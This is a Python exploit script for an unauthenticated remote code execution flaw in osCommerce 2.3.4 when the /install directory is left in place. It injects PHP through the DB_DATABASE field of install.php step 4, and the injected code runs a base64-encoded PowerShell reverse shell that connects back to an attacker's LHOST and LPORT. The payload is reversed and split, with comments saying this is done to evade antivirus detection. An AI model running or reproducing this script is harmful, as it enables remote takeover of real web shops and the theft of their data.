# Exploit Title: osCommerce 2.3.4.1 - Remote Code Execution (2)
# Vulnerability: Remote Command Execution when /install directory wasn't removed by the admin
# Exploit: Exploiting the install.php finish process by injecting php payload into the db_database parameter & read the system command output from configure.php
# Notes: The RCE doesn't need to be authenticated
# Date: 26/06/2021
# Exploit Author: Bryan Leong <NobodyAtall>
# Improved by 20100dbg
# Vendor Homepage: https://www.oscommerce.com/
# Version: osCommerce 2.3.4
# Tested on: Windows


import base64
import requests
import sys

if(len(sys.argv) != 4):
    print("osCommerce 2.3.4 exploit")
    print("Please start a listener on LPORT")
    print(f"Usage : python {sys.argv[0]} <catalog url> <LHOST> <LPORT>")
    sys.exit(0)

url = sys.argv[1].rstrip('/')
LHOST = sys.argv[2]
LPORT = sys.argv[3]

#test
res = requests.get(url + '/install/install.php')

if(res.status_code == 200):
    print('[+] Target seems vulnerable')
else:
    print('[-] Target does NOT seem vulnerable')

#from https://www.revshells.com/
#reversed to evade AV detection
x = '"(tneilCPCT.stekcoS.teN.metsyS tcejbO-weN = c$'
y = ')(esolC.c$;})(hsulF.s$;)htgneL.etybdnes$,0,etybdnes$(etirW.s$;)2bs$(setyBteG.)IICSA::]gnidocne.txet[( = etybdnes$;" >" + htaP.)dwp( + " SP" + bs$ = 2bs$;) gnirtS-tuO | 1&>2 atad$ xei( = bs$;)i$ ,0,setyb$(gnirtSteG.)gnidocnEIICSA.txeT.metsyS emaNepyT- tcejbO-weN( = atad$;{)0 en- ))htgneL.setyb$ ,0 ,setyb$(daeR.s$ = i$((elihw;}0{%|53556..0 = setyb$]][etyb[;)(maertSteG.c$ = s$;)'
revshell = x[::-1] + LHOST +'",'+ LPORT + y[::-1]
revshell = revshell.encode('utf-16le')
revshell_b64 = base64.b64encode(revshell)
shell = "pow"+"ershe"+"ll.exe -e " + revshell_b64.decode()

# save payload on server
print("[+] Sending malicious script")
payload = "');passthru('" + shell + "');/*"
res = requests.post(url + '/install/install.php?step=4', data={'DIR_FS_DOCUMENT_ROOT': './','DB_DATABASE' : payload})

# exec shell
print("[+] Exec shell")
res = requests.get(url + '/install/includes/configure.php')
